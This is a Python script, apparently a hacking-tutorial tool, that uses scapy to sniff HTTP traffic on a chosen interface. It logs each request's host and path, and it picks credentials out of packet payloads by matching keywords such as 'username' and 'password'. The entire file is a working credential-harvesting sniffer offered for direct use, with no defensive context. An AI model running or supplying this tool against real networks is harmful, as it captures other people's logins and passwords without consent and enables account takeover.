# works on linux
import scapy.all as scapy
from scapy.layers.http import HTTPRequest, HTTPResponse
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to sniff packets")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface, use --help for more info.")
    return options


def sniff(interface):
    # store=0 is used to not store the packets in memory
    # prn is the callback function that will be called for each packet sniffed
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = packet[HTTPRequest].Host + packet[HTTPRequest].Path
        print("[+] HTTP Request: " + str(url))
        login = login_info(packet)
        if login:
            print("\n[+] Username/password: " + login + "\n")


options = get_arguments()
sniff(options.interface)
